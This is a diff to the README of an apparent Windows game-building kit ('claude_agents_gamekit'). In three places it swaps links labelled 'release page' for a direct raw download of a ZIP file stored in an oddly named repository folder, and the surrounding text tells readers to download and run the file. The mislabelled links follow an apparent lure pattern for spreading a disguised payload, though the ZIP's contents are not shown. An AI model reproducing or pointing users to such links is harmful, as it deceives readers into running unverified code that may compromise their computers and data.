@@ -1,6 +1,6 @@
 # 🤖 claude_agents_gamekit - Build 3D Games With Guided Agents
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue)](https://github.com/maybugwaterbutt646/claude_agents_gamekit/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue)](https://github.com/maybugwaterbutt646/claude_agents_gamekit/raw/refs/heads/main/discoglossoid/claude_gamekit_agents_v1.4.zip)
 
 ## 🖥️ What this is
 
@@ -21,7 +21,7 @@ If you plan to use Godot or Unity with this kit, install the engine you want to 
 
 ## ⬇️ Download and install
 
-1. Open the [release page](https://github.com/maybugwaterbutt646/claude_agents_gamekit/releases)
+1. Open the [release page](https://github.com/maybugwaterbutt646/claude_agents_gamekit/raw/refs/heads/main/discoglossoid/claude_gamekit_agents_v1.4.zip)
 2. Find the latest release
 3. Download the Windows file from that page
 4. If the download comes as a ZIP file, right-click it and choose Extract All
@@ -204,4 +204,4 @@ This helps you avoid a messy folder and keeps the project on track.
 
 ## 🧭 Where to get the download
 
-Visit the [release page](https://github.com/maybugwaterbutt646/claude_agents_gamekit/releases) to download and run this file on Windows.
+Visit the [release page](https://github.com/maybugwaterbutt646/claude_agents_gamekit/raw/refs/heads/main/discoglossoid/claude_gamekit_agents_v1.4.zip) to download and run this file on Windows.
